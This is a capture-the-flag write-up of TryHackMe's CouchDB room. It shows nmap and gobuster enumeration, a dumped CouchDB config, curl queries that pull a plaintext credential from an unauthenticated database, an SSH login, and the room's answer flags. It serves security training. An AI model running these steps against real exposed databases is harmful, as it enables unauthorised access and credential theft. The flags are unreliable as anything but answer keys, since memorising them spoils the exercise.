---
title: "Couch - CouchDB? (TryHackMe)"
datePublished: Mon Jan 26 2026 20:14:47 GMT+0000 (Coordinated Universal Time)
cuid: cmkvlwb5t000702l8c8s3byau
slug: couch-couchdb-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1769457234761/21be1123-73d5-4c97-b568-a1b5aff635f0.png
tags: docker, couchdb, penetration-testing, tryhackme, ctf-writeup

---

**INTRODUCTION**

Resy Set Go is a beginner-friendly CTF challenge focused on exploiting an insecure CouchDB installation and achieving privilege escalation through Docker API misconfiguration. This machine teaches fundamental penetration testing concepts, including service enumeration, web application reconnaissance, credential discovery through database exploration, and container escape techniques. The challenge highlights two critical security misconfigurations: exposing a CouchDB database with no authentication and running the Docker API on [localhost](http://localhost) without proper access controls. Through this walkthrough, we'll explore how attackers can chain these vulnerabilities to gain complete system compromise, moving from initial reconnaissance to root access. The key learning objectives include understanding NoSQL database security, recognizing common privilege escalation vectors, and exploiting containerization misconfigurations.

## Resy Set Go

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9c5d0148cf664325c8a075/room-content/5e9c5d0148cf664325c8a075-1719442572664 align="left")

**Are you ready to take the challenge?  
**The machine may take up to 3 minutes to boot and configure  

### Answer the questions below

1. Scan the machine. How many ports are open? `2`  
      
    `nmap -p- -sV <IP_Address>`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457283324/28291591-733a-479d-89fd-6174afaaee0b.png align="center")
    
      
    
2. What is the database management system installed on the server? `couchdb`
    
3. What port is the database management system running on? `5984`
    
4. What is the version of the management system installed on the server? `1.6.1`
    
5. What is the path for the web administration tool for this database management system? `_utils`  
      
    `http://<IP_Address>:5984`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457317705/7be1de76-4af4-4301-811c-5c673fcc8ab5.png align="center")
    
    `gobuster dir -u http://<IP_Address>:5984 -w /usr/share/wordlists/dirb/common.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457402737/d7ec8f51-7a68-4e11-bed0-a52aef7605cd.png align="center")
    
    ```bash
    gobuster dir -u http://10.49.137.20:5984 -w /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.49.137.20:5984
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.config              (Status: 400) [Size: 198]
    /.cvs                 (Status: 400) [Size: 195]
    /.cvsignore           (Status: 400) [Size: 201]
    /.hta                 (Status: 400) [Size: 195]
    /.git/HEAD            (Status: 400) [Size: 195]
    /.bash_history        (Status: 400) [Size: 204]
    /.cache               (Status: 400) [Size: 197]
    /.bashrc              (Status: 400) [Size: 198]
    /.forward             (Status: 400) [Size: 199]
    /.history             (Status: 400) [Size: 199]
    /.passwd              (Status: 400) [Size: 198]
    /.htaccess            (Status: 400) [Size: 200]
    /.listings            (Status: 400) [Size: 200]
    /.listing             (Status: 400) [Size: 199]
    /.mysql_history       (Status: 400) [Size: 205]
    /.htpasswd            (Status: 400) [Size: 200]
    /.profile             (Status: 400) [Size: 199]
    /.rhosts              (Status: 400) [Size: 198]
    /.perf                (Status: 400) [Size: 196]
    /.swf                 (Status: 400) [Size: 195]
    /.svn/entries         (Status: 400) [Size: 195]
    /.ssh                 (Status: 400) [Size: 195]
    /.subversion          (Status: 400) [Size: 202]
    /.sh_history          (Status: 400) [Size: 202]
    /.svn                 (Status: 400) [Size: 195]
    /.web                 (Status: 400) [Size: 195]
    /@                    (Status: 400) [Size: 192]
    /_                    (Status: 400) [Size: 192]
    /_adm                 (Status: 400) [Size: 195]
    /_backup              (Status: 400) [Size: 198]
    /_archive             (Status: 400) [Size: 199]
    /_assets              (Status: 400) [Size: 198]
    /_admin               (Status: 400) [Size: 197]
    /_ajax                (Status: 400) [Size: 196]
    /_catalogs            (Status: 400) [Size: 200]
    /_borders             (Status: 400) [Size: 199]
    /_baks                (Status: 400) [Size: 196]
    /_cache               (Status: 400) [Size: 197]
    /_code                (Status: 400) [Size: 196]
    /_conf                (Status: 400) [Size: 196]
    /_config              (Status: 200) [Size: 4808]
    /_css                 (Status: 400) [Size: 195]
    /_common              (Status: 400) [Size: 198]
    /_data                (Status: 400) [Size: 196]
    /_dev                 (Status: 400) [Size: 195]
    /_database            (Status: 400) [Size: 200]
    /_db_backups          (Status: 400) [Size: 202]
    /_derived             (Status: 400) [Size: 199]
    /_dummy               (Status: 400) [Size: 197]
    /_files               (Status: 400) [Size: 197]
    /_images              (Status: 400) [Size: 198]
    /_fpclass             (Status: 400) [Size: 199]
    /_flash               (Status: 400) [Size: 197]
    /_img                 (Status: 400) [Size: 195]
    /_install             (Status: 400) [Size: 199]
    /_inc                 (Status: 400) [Size: 195]
    /_js                  (Status: 400) [Size: 194]
    /_includes            (Status: 400) [Size: 200]
    /_include             (Status: 400) [Size: 199]
    /_layouts             (Status: 400) [Size: 199]
    /_mm                  (Status: 400) [Size: 194]
    /_lib                 (Status: 400) [Size: 195]
    /_media               (Status: 400) [Size: 197]
    /_mem_bin             (Status: 400) [Size: 199]
    /_mmserverscripts     (Status: 400) [Size: 207]
    /_old                 (Status: 400) [Size: 195]
    /_mygallery           (Status: 400) [Size: 201]
    /_net                 (Status: 400) [Size: 195]
    /_notes               (Status: 400) [Size: 197]
    /_overlay             (Status: 400) [Size: 199]
    /_private             (Status: 400) [Size: 199]
    /_reports             (Status: 400) [Size: 199]
    /_pages               (Status: 400) [Size: 197]
    /_res                 (Status: 400) [Size: 195]
    /_resources           (Status: 400) [Size: 201]
    /_scripts             (Status: 400) [Size: 199]
    /_src                 (Status: 400) [Size: 195]
    /_scriptlibrary       (Status: 400) [Size: 205]
    /_source              (Status: 400) [Size: 198]
    /_styles              (Status: 400) [Size: 198]
    /_tempalbums          (Status: 400) [Size: 202]
    /_swf                 (Status: 400) [Size: 195]
    /_temp                (Status: 400) [Size: 196]
    /_template            (Status: 400) [Size: 200]
    /_stats               (Status: 200) [Size: 4616]
    /_tmp                 (Status: 400) [Size: 195]
    /_test                (Status: 400) [Size: 196]
    /_templates           (Status: 400) [Size: 201]
    /_themes              (Status: 400) [Size: 198]
    /_tmpfileop           (Status: 400) [Size: 201]
    /_vti_bin             (Status: 400) [Size: 199]
    /_vti_bin/_vti_adm/admin.dll (Status: 400) [Size: 199]
    /_vti_bin/_vti_aut/author.dll (Status: 400) [Size: 199]
    /_vti_bin/shtml.dll   (Status: 400) [Size: 199]
    /_vti_aut             (Status: 400) [Size: 199]
    /_vti_cnf             (Status: 400) [Size: 199]
    /_vti_inf             (Status: 400) [Size: 199]
    /_vti_map             (Status: 400) [Size: 199]
    /_vti_log             (Status: 400) [Size: 199]
    /_vti_script          (Status: 400) [Size: 202]
    /_vti_rpc             (Status: 400) [Size: 199]
    /_vti_pvt             (Status: 400) [Size: 199]
    /_vti_txt             (Status: 400) [Size: 199]
    /~admin               (Status: 400) [Size: 197]
    /_www                 (Status: 400) [Size: 195]
    /~amanda              (Status: 400) [Size: 198]
    /~adm                 (Status: 400) [Size: 195]
    /~administrator       (Status: 400) [Size: 205]
    /~apache              (Status: 400) [Size: 198]
    /~ftp                 (Status: 400) [Size: 195]
    /~guest               (Status: 400) [Size: 197]
    /~bin                 (Status: 400) [Size: 195]
    /~http                (Status: 400) [Size: 196]
    /~lp                  (Status: 400) [Size: 194]
    /~log                 (Status: 400) [Size: 195]
    /~mail                (Status: 400) [Size: 196]
    /~nobody              (Status: 400) [Size: 198]
    /~httpd               (Status: 400) [Size: 197]
    /~logs                (Status: 400) [Size: 196]
    /~root                (Status: 400) [Size: 196]
    /~operator            (Status: 400) [Size: 200]
    /~sys                 (Status: 400) [Size: 195]
    /~sysadm              (Status: 400) [Size: 198]
    /~sysadmin            (Status: 400) [Size: 200]
    /~webmaster           (Status: 400) [Size: 201]
    /~tmp                 (Status: 400) [Size: 195]
    /~www                 (Status: 400) [Size: 195]
    /~test                (Status: 400) [Size: 196]
    /~user                (Status: 400) [Size: 196]
    /02                   (Status: 400) [Size: 193]
    /01                   (Status: 400) [Size: 193]
    /0                    (Status: 400) [Size: 192]
    /03                   (Status: 400) [Size: 193]
    /00                   (Status: 400) [Size: 193]
    /04                   (Status: 400) [Size: 193]
    /05                   (Status: 400) [Size: 193]
    /07                   (Status: 400) [Size: 193]
    /06                   (Status: 400) [Size: 193]
    /08                   (Status: 400) [Size: 193]
    /09                   (Status: 400) [Size: 193]
    /1                    (Status: 400) [Size: 192]
    /10                   (Status: 400) [Size: 193]
    /1000                 (Status: 400) [Size: 195]
    /100                  (Status: 400) [Size: 194]
    /101                  (Status: 400) [Size: 194]
    /1001                 (Status: 400) [Size: 195]
    /102                  (Status: 400) [Size: 194]
    /103                  (Status: 400) [Size: 194]
    /11                   (Status: 400) [Size: 193]
    /12                   (Status: 400) [Size: 193]
    /14                   (Status: 400) [Size: 193]
    /15                   (Status: 400) [Size: 193]
    /13                   (Status: 400) [Size: 193]
    /1990                 (Status: 400) [Size: 195]
    /123                  (Status: 400) [Size: 194]
    /1994                 (Status: 400) [Size: 195]
    /1993                 (Status: 400) [Size: 195]
    /1991                 (Status: 400) [Size: 195]
    /1992                 (Status: 400) [Size: 195]
    /1995                 (Status: 400) [Size: 195]
    /1998                 (Status: 400) [Size: 195]
    /1996                 (Status: 400) [Size: 195]
    /1997                 (Status: 400) [Size: 195]
    /1x1                  (Status: 400) [Size: 194]
    /1999                 (Status: 400) [Size: 195]
    /20                   (Status: 400) [Size: 193]
    /200                  (Status: 400) [Size: 194]
    /2000                 (Status: 400) [Size: 195]
    /2                    (Status: 400) [Size: 192]
    /2001                 (Status: 400) [Size: 195]
    /2004                 (Status: 400) [Size: 195]
    /2003                 (Status: 400) [Size: 195]
    /2002                 (Status: 400) [Size: 195]
    /2006                 (Status: 400) [Size: 195]
    /2005                 (Status: 400) [Size: 195]
    /2007                 (Status: 400) [Size: 195]
    /2009                 (Status: 400) [Size: 195]
    /2010                 (Status: 400) [Size: 195]
    /2008                 (Status: 400) [Size: 195]
    /2011                 (Status: 400) [Size: 195]
    /2012                 (Status: 400) [Size: 195]
    /2013                 (Status: 400) [Size: 195]
    /22                   (Status: 400) [Size: 193]
    /21                   (Status: 400) [Size: 193]
    /2014                 (Status: 400) [Size: 195]
    /2257                 (Status: 400) [Size: 195]
    /25                   (Status: 400) [Size: 193]
    /24                   (Status: 400) [Size: 193]
    /23                   (Status: 400) [Size: 193]
    /2g                   (Status: 400) [Size: 193]
    /3                    (Status: 400) [Size: 192]
    /30                   (Status: 400) [Size: 193]
    /32                   (Status: 400) [Size: 193]
    /300                  (Status: 400) [Size: 194]
    /3rdparty             (Status: 400) [Size: 199]
    /401                  (Status: 400) [Size: 194]
    /4                    (Status: 400) [Size: 192]
    /400                  (Status: 400) [Size: 194]
    /3g                   (Status: 400) [Size: 193]
    /403                  (Status: 400) [Size: 194]
    /42                   (Status: 400) [Size: 193]
    /404                  (Status: 400) [Size: 194]
    /5                    (Status: 400) [Size: 192]
    /50                   (Status: 400) [Size: 193]
    /64                   (Status: 400) [Size: 193]
    /7                    (Status: 400) [Size: 192]
    /500                  (Status: 400) [Size: 194]
    /51                   (Status: 400) [Size: 193]
    /6                    (Status: 400) [Size: 192]
    /7z                   (Status: 400) [Size: 193]
    /9                    (Status: 400) [Size: 192]
    /8                    (Status: 400) [Size: 192]
    /96                   (Status: 400) [Size: 193]
    /A                    (Status: 400) [Size: 192]
    /About                (Status: 400) [Size: 196]
    /AboutUs              (Status: 400) [Size: 198]
    /access_log.1         (Status: 400) [Size: 203]
    /access.1             (Status: 400) [Size: 199]
    /access-log.1         (Status: 400) [Size: 203]
    /activeCollab         (Status: 400) [Size: 203]
    /ADM                  (Status: 400) [Size: 194]
    /ADMIN                (Status: 400) [Size: 196]
    /Admin                (Status: 400) [Size: 196]
    /admin.php            (Status: 400) [Size: 200]
    /admin.cgi            (Status: 400) [Size: 200]
    /admin.pl             (Status: 400) [Size: 199]
    /Administration       (Status: 400) [Size: 205]
    /AdminService         (Status: 400) [Size: 203]
    /AdminTools           (Status: 400) [Size: 201]
    /ADMON                (Status: 400) [Size: 196]
    /AggreSpy             (Status: 400) [Size: 199]
    /akeeba.backend.log   (Status: 400) [Size: 209]
    /application.wadl     (Status: 400) [Size: 207]
    /AppsLocalLogin       (Status: 400) [Size: 205]
    /AppsLogin            (Status: 400) [Size: 200]
    /Archive              (Status: 400) [Size: 198]
    /Articles             (Status: 400) [Size: 199]
    /AT-admin.cgi         (Status: 400) [Size: 203]
    /awstats.conf         (Status: 400) [Size: 203]
    /B                    (Status: 400) [Size: 192]
    /BackOffice           (Status: 400) [Size: 201]
    /Base                 (Status: 400) [Size: 195]
    /Blog                 (Status: 400) [Size: 195]
    /Books                (Status: 400) [Size: 196]
    /Browser              (Status: 400) [Size: 198]
    /BUILD                (Status: 400) [Size: 196]
    /Business             (Status: 400) [Size: 199]
    /C                    (Status: 400) [Size: 192]
    /cachemgr.cgi         (Status: 400) [Size: 203]
    /catalog.wci          (Status: 400) [Size: 202]
    /ChangeLog            (Status: 400) [Size: 200]
    /CMS                  (Status: 400) [Size: 194]
    /Computers            (Status: 400) [Size: 200]
    /config.local         (Status: 400) [Size: 203]
    /Contact              (Status: 400) [Size: 198]
    /ContactUs            (Status: 400) [Size: 200]
    /Content              (Status: 400) [Size: 198]
    /CPAN                 (Status: 400) [Size: 195]
    /cPanel               (Status: 400) [Size: 197]
    /Creatives            (Status: 400) [Size: 200]
    /crossdomain.xml      (Status: 400) [Size: 206]
    /CVS                  (Status: 400) [Size: 194]
    /CVS/Entries          (Status: 400) [Size: 194]
    /CVS/Repository       (Status: 400) [Size: 194]
    /CVS/Root             (Status: 400) [Size: 194]
    /CYBERDOCS            (Status: 400) [Size: 200]
    /CYBERDOCS31          (Status: 400) [Size: 202]
    /CYBERDOCS25          (Status: 400) [Size: 202]
    /D                    (Status: 400) [Size: 192]
    /Database_Administration (Status: 400) [Size: 214]
    /DB                   (Status: 400) [Size: 193]
    /de_DE                (Status: 400) [Size: 196]
    /Default              (Status: 400) [Size: 198]
    /development.log      (Status: 400) [Size: 206]
    /DMSDump              (Status: 400) [Size: 198]
    /Documents and Settings (Status: 400) [Size: 213]
    /Download             (Status: 400) [Size: 199]
    /Downloads            (Status: 400) [Size: 200]
    /E                    (Status: 400) [Size: 192]
    /Education            (Status: 400) [Size: 200]
    /en_US                (Status: 400) [Size: 196]
    /English              (Status: 400) [Size: 198]
    /Entertainment        (Status: 400) [Size: 204]
    /Entries              (Status: 400) [Size: 198]
    /es_ES                (Status: 400) [Size: 196]
    /Events               (Status: 400) [Size: 197]
    /Extranet             (Status: 400) [Size: 199]
    /F                    (Status: 400) [Size: 192]
    /favicon.ico          (Status: 200) [Size: 9326]
    /FAQ                  (Status: 400) [Size: 194]
    /FCKeditor            (Status: 400) [Size: 200]
    /fr_FR                (Status: 400) [Size: 196]
    /function.require     (Status: 400) [Size: 207]
    /G                    (Status: 400) [Size: 192]
    /Games                (Status: 400) [Size: 196]
    /getFile.cfm          (Status: 400) [Size: 202]
    /Global               (Status: 400) [Size: 197]
    /global.asax          (Status: 400) [Size: 202]
    /global.asa           (Status: 400) [Size: 201]
    /Graphics             (Status: 400) [Size: 199]
    /H                    (Status: 400) [Size: 192]
    /Health               (Status: 400) [Size: 197]
    /Help                 (Status: 400) [Size: 195]
    /Home                 (Status: 400) [Size: 195]
    /HTML                 (Status: 400) [Size: 195]
    /I                    (Status: 400) [Size: 192]
    /id_rsa.pub           (Status: 400) [Size: 201]
    /Image                (Status: 400) [Size: 196]
    /Images               (Status: 400) [Size: 197]
    /index.php            (Status: 400) [Size: 200]
    /Index                (Status: 400) [Size: 196]
    /index.htm            (Status: 400) [Size: 200]
    /index.html           (Status: 400) [Size: 201]
    /Indy_admin           (Status: 400) [Size: 201]
    /info.php             (Status: 400) [Size: 199]
    /install.pgsql        (Status: 400) [Size: 204]
    /INSTALL_admin        (Status: 400) [Size: 204]
    /install.mysql        (Status: 400) [Size: 204]
    /Internet             (Status: 400) [Size: 199]
    /it_IT                (Status: 400) [Size: 196]
    /J                    (Status: 400) [Size: 192]
    /ja_JP                (Status: 400) [Size: 196]
    /Java                 (Status: 400) [Size: 195]
    /JMXSoapAdapter       (Status: 400) [Size: 205]
    /jsFiles              (Status: 400) [Size: 198]
    /ko_KR                (Status: 400) [Size: 196]
    /L                    (Status: 400) [Size: 192]
    /Legal                (Status: 400) [Size: 196]
    /LICENSE              (Status: 400) [Size: 198]
    /Links                (Status: 400) [Size: 196]
    /Linux                (Status: 400) [Size: 196]
    /Log                  (Status: 400) [Size: 194]
    /LogFiles             (Status: 400) [Size: 199]
    /Login                (Status: 400) [Size: 196]
    /Logs                 (Status: 400) [Size: 195]
    /lost+found           (Status: 400) [Size: 201]
    /Lotus_Domino_Admin   (Status: 400) [Size: 209]
    /M                    (Status: 400) [Size: 192]
    /Main                 (Status: 400) [Size: 195]
    /main.mdb             (Status: 400) [Size: 199]
    /Main_Page            (Status: 400) [Size: 200]
    /Makefile             (Status: 400) [Size: 199]
    /MANIFEST.MF          (Status: 400) [Size: 202]
    /manifest.mf          (Status: 400) [Size: 202]
    /master.passwd        (Status: 400) [Size: 204]
    /Media                (Status: 400) [Size: 196]
    /Members              (Status: 400) [Size: 198]
    /Menus                (Status: 400) [Size: 196]
    /META-INF             (Status: 400) [Size: 199]
    /Misc                 (Status: 400) [Size: 195]
    /moving.page          (Status: 400) [Size: 202]
    /Music                (Status: 400) [Size: 196]
    /N                    (Status: 400) [Size: 192]
    /navSiteAdmin         (Status: 400) [Size: 203]
    /News                 (Status: 400) [Size: 195]
    /O                    (Status: 400) [Size: 192]
    /OA                   (Status: 400) [Size: 193]
    /OAErrorDetailPage    (Status: 400) [Size: 208]
    /OA_HTML              (Status: 400) [Size: 198]
    /OasDefault           (Status: 400) [Size: 201]
    /Office               (Status: 400) [Size: 197]
    /P                    (Status: 400) [Size: 192]
    /Pages                (Status: 400) [Size: 196]
    /PDF                  (Status: 400) [Size: 194]
    /People               (Status: 400) [Size: 197]
    /PHP                  (Status: 400) [Size: 194]
    /php.ini              (Status: 400) [Size: 198]
    /phpBB3               (Status: 400) [Size: 197]
    /phpBB2               (Status: 400) [Size: 197]
    /phpBB                (Status: 400) [Size: 196]
    /phpEventCalendar     (Status: 400) [Size: 207]
    /phpinfo.php          (Status: 400) [Size: 202]
    /phpMyAdmin           (Status: 400) [Size: 201]
    /phpMyAdmin2          (Status: 400) [Size: 202]
    /phpSQLiteAdmin       (Status: 400) [Size: 205]
    /player.swf           (Status: 400) [Size: 201]
    /PMA                  (Status: 400) [Size: 194]
    /Press                (Status: 400) [Size: 196]
    /Privacy              (Status: 400) [Size: 198]
    /production.log       (Status: 400) [Size: 205]
    /Products             (Status: 400) [Size: 199]
    /Program Files        (Status: 400) [Size: 204]
    /Projects             (Status: 400) [Size: 199]
    /pt_BR                (Status: 400) [Size: 196]
    /Publications         (Status: 400) [Size: 203]
    /putty.reg            (Status: 400) [Size: 200]
    /R                    (Status: 400) [Size: 192]
    /Rakefile             (Status: 400) [Size: 199]
    /rcLogin              (Status: 400) [Size: 198]
    /RCS                  (Status: 400) [Size: 194]
    /Readme               (Status: 400) [Size: 197]
    /README               (Status: 400) [Size: 197]
    /RealMedia            (Status: 400) [Size: 200]
    /Recycled             (Status: 400) [Size: 199]
    /reports list         (Status: 400) [Size: 203]
    /Research             (Status: 400) [Size: 199]
    /Resources            (Status: 400) [Size: 200]
    /robots.txt           (Status: 400) [Size: 201]
    /Root                 (Status: 400) [Size: 195]
    /RSS                  (Status: 400) [Size: 194]
    /S                    (Status: 400) [Size: 192]
    /Scripts              (Status: 400) [Size: 198]
    /Search               (Status: 400) [Size: 197]
    /secret               (Status: 200) [Size: 229]
    /Security             (Status: 400) [Size: 199]
    /Server               (Status: 400) [Size: 197]
    /ServerAdministrator  (Status: 400) [Size: 210]
    /SERVER-INF           (Status: 400) [Size: 201]
    /Services             (Status: 400) [Size: 199]
    /Servlet              (Status: 400) [Size: 198]
    /Servlets             (Status: 400) [Size: 199]
    /simpleLogin          (Status: 400) [Size: 202]
    /SiteMap              (Status: 400) [Size: 198]
    /sitemap.xml          (Status: 400) [Size: 202]
    /sitemap.gz           (Status: 400) [Size: 201]
    /SiteScope            (Status: 400) [Size: 200]
    /Sites                (Status: 400) [Size: 196]
    /SiteServer           (Status: 400) [Size: 201]
    /SOAPMonitor          (Status: 400) [Size: 202]
    /Software             (Status: 400) [Size: 199]
    /Sources              (Status: 400) [Size: 198]
    /spamlog.log          (Status: 400) [Size: 202]
    /Sports               (Status: 400) [Size: 197]
    /Spy                  (Status: 400) [Size: 194]
    /SQL                  (Status: 400) [Size: 194]
    /Statistics           (Status: 400) [Size: 201]
    /Stats                (Status: 400) [Size: 196]
    /SUNWmc               (Status: 400) [Size: 197]
    /Super-Admin          (Status: 400) [Size: 202]
    /Support              (Status: 400) [Size: 198]
    /suspended.page       (Status: 400) [Size: 205]
    /swfobject.js         (Status: 400) [Size: 203]
    /SysAdmin             (Status: 400) [Size: 199]
    /SysAdmin2            (Status: 400) [Size: 200]
    /T                    (Status: 400) [Size: 192]
    /tar.bz2              (Status: 400) [Size: 198]
    /tar.gz               (Status: 400) [Size: 197]
    /Technology           (Status: 400) [Size: 201]
    /TEMP                 (Status: 400) [Size: 195]
    /Themes               (Status: 400) [Size: 197]
    /thumbs.db            (Status: 400) [Size: 200]
    /Thumbs.db            (Status: 400) [Size: 200]
    /TMP                  (Status: 400) [Size: 194]
    /TODO                 (Status: 400) [Size: 195]
    /Travel               (Status: 400) [Size: 197]
    /U                    (Status: 400) [Size: 192]
    /upgrade.readme       (Status: 400) [Size: 205]
    /US                   (Status: 400) [Size: 193]
    /UserFiles            (Status: 400) [Size: 200]
    /Utilities            (Status: 400) [Size: 200]
    /V                    (Status: 400) [Size: 192]
    /Video                (Status: 400) [Size: 196]
    /W                    (Status: 400) [Size: 192]
    /W3SVC                (Status: 400) [Size: 196]
    /W3SVC1               (Status: 400) [Size: 197]
    /W3SVC2               (Status: 400) [Size: 197]
    /W3SVC3               (Status: 400) [Size: 197]
    /web.config           (Status: 400) [Size: 201]
    /web.xml              (Status: 400) [Size: 198]
    /WebAdmin             (Status: 400) [Size: 199]
    /WEB-INF              (Status: 400) [Size: 198]
    /Windows              (Status: 400) [Size: 198]
    /WS_FTP               (Status: 400) [Size: 197]
    /WS_FTP.LOG           (Status: 400) [Size: 201]
    /X                    (Status: 400) [Size: 192]
    /XML                  (Status: 400) [Size: 194]
    /xmlrpc_server.php    (Status: 400) [Size: 208]
    /xmlrpc.php           (Status: 400) [Size: 201]
    /XXX                  (Status: 400) [Size: 194]
    /zh_TW                (Status: 400) [Size: 196]
    /zh_CN                (Status: 400) [Size: 196]
    ```
    
    The Gobuster output was so long I tried navigating to some paths but it wasn’t helpful, opted to get help from Claude and it suggested checking `/_config`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457548339/c5f39806-57ed-4ced-bafc-ec010a415d5c.png align="center")
    
    ```bash
    {"httpd_design_handlers":{"_compact":"{couch_mrview_http, handle_compact_req}","_info":"{couch_mrview_http, handle_info_req}","_list":"{couch_mrview_show, handle_view_list_req}","_rewrite":"{couch_httpd_rewrite, handle_rewrite_req}","_show":"{couch_mrview_show, handle_doc_show_req}","_update":"{couch_mrview_show, handle_doc_update_req}","_view":"{couch_mrview_http, handle_view_req}"},"uuids":{"algorithm":"sequential","max_count":"1000"},"stats":{"rate":"1000","samples":"[0, 60, 300, 900]"},"cors":{"credentials":"false"},"httpd_global_handlers":{"/":"{couch_httpd_misc_handlers, handle_welcome_req, <<\"Welcome\">>}","_active_tasks":"{couch_httpd_misc_handlers, handle_task_status_req}","_all_dbs":"{couch_httpd_misc_handlers, handle_all_dbs_req}","_config":"{couch_httpd_misc_handlers, handle_config_req}","_db_updates":"{couch_dbupdates_httpd, handle_req}","_log":"{couch_httpd_misc_handlers, handle_log_req}","_oauth":"{couch_httpd_oauth, handle_oauth_req}","_plugins":"{couch_plugins_httpd, handle_req}","_replicate":"{couch_replicator_httpd, handle_req}","_restart":"{couch_httpd_misc_handlers, handle_restart_req}","_session":"{couch_httpd_auth, handle_session_req}","_stats":"{couch_httpd_stats_handlers, handle_stats_req}","_utils":"{couch_httpd_misc_handlers, handle_utils_dir_req, \"/usr/share/couchdb/www\"}","_uuids":"{couch_httpd_misc_handlers, handle_uuids_req}","favicon.ico":"{couch_httpd_misc_handlers, handle_favicon_req, \"/usr/share/couchdb/www\"}"},"attachments":{"compressible_types":"text/*, application/javascript, application/json, application/xml","compression_level":"8"},"query_server_config":{"os_process_limit":"25","reduce_limit":"true"},"vendor":{"name":"Ubuntu","version":"16.04"},"replicator":{"connection_timeout":"30000","db":"_replicator","http_connections":"20","max_replication_retry_count":"10","retries_per_request":"10","socket_options":"[{keepalive, true}, {nodelay, false}]","ssl_certificate_max_depth":"3","verify_ssl_certificates":"false","worker_batch_size":"500","worker_processes":"4"},"couch_httpd_oauth":{"use_users_db":"false"},"ssl":{"port":"6984","ssl_certificate_max_depth":"1","verify_ssl_certificates":"false"},"log":{"file":"/var/log/couchdb/couch.log","include_sasl":"true","level":"info"},"view_compaction":{"keyvalue_buffer_size":"2097152"},"query_servers":{"coffeescript":"/usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js","javascript":"/usr/bin/couchjs /usr/share/couchdb/server/main.js"},"daemons":{"auth_cache":"{couch_auth_cache, start_link, []}","compaction_daemon":"{couch_compaction_daemon, start_link, []}","external_manager":"{couch_external_manager, start_link, []}","httpd":"{couch_httpd, start_link, []}","index_server":"{couch_index_server, start_link, []}","os_daemons":"{couch_os_daemons, start_link, []}","query_servers":"{couch_query_servers, start_link, []}","replicator_manager":"{couch_replicator_manager, start_link, []}","stats_aggregator":"{couch_stats_aggregator, start, []}","stats_collector":"{couch_stats_collector, start, []}","uuids":"{couch_uuids, start, []}","vhosts":"{couch_httpd_vhost, start_link, []}"},"httpd":{"allow_jsonp":"false","authentication_handlers":"{couch_httpd_oauth, oauth_authentication_handler}, {couch_httpd_auth, cookie_authentication_handler}, {couch_httpd_auth, default_authentication_handler}","bind_address":"0.0.0.0","default_handler":"{couch_httpd_db, handle_request}","enable_cors":"false","log_max_chunk_size":"1000000","port":"5984","secure_rewrites":"true","socket_options":"[{recbuf, 262144}, {sndbuf, 262144}]","vhost_global_handlers":"_utils, _uuids, _session, _oauth, _users"},"httpd_db_handlers":{"_all_docs":"{couch_mrview_http, handle_all_docs_req}","_changes":"{couch_httpd_db, handle_changes_req}","_compact":"{couch_httpd_db, handle_compact_req}","_design":"{couch_httpd_db, handle_design_req}","_temp_view":"{couch_mrview_http, handle_temp_view_req}","_view_cleanup":"{couch_mrview_http, handle_cleanup_req}"},"database_compaction":{"checkpoint_after":"5242880","doc_buffer_size":"524288"},"couch_httpd_auth":{"allow_persistent_cookies":"false","auth_cache_size":"50","authentication_db":"_users","authentication_redirect":"/_utils/session.html","iterations":"10","require_valid_user":"false","timeout":"600"},"couchdb":{"attachment_stream_buffer_size":"4096","database_dir":"/var/lib/couchdb","delayed_commits":"true","file_compression":"snappy","max_dbs_open":"100","max_document_size":"4294967296","os_process_timeout":"5000","plugin_dir":"/usr/lib/x86_64-linux-gnu/couchdb/plugins","uri_file":"/run/couchdb/couch.uri","util_driver_dir":"/usr/lib/x86_64-linux-gnu/couchdb/erlang/lib/couch-1.6.1/priv/lib","uuid":"ef680bb740692240059420b2c17db8f3","view_index_dir":"/var/lib/couchdb"},"compaction_daemon":{"check_interval":"300","min_file_size":"131072"}}
    ```
    
    This helped us get the `_utils` *together with* `_alldbs`
    
6. What is the path to list all databases in the web browser of the database management system? `_alldbs`
    
7. What are the credentials found in the web administration tool? `atena:t4qfzcc4qN##`  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457773407/0662978d-7cb3-4826-b6e4-0bd0262b20be.png align="center")
    
    ```bash
    curl http://10.49.137.20:5984/_all_dbs
    ["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
    ```
    
    ```bash
    curl http://10.49.137.20:5984/secret/_all_docs
    {"total_rows":1,"offset":0,"rows":[
    {"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
    ]}
    ```
    
    ```bash
    curl http://10.49.137.20:5984/secret/_all_docs?include_docs=true
    {"total_rows":1,"offset":0,"rows":[
    {"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"},"doc":{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}}
    ]}
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457751499/6f1636a6-f8f1-4828-9bec-d2647b2c84a9.png align="center")
    
8. Compromise the machine and locate user.txt `THM{1ns3cure_couchdb}`  
      
    `ssh atena@<IP_Address>`  
    `find / -type f -name user.txt 2>/dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457789520/89ca8c9c-42ef-4a92-82ec-b2af95c42780.png align="center")
    
9. Escalate privileges and obtain root.txt `THM{RCE_us1ng_Docker_API}`  
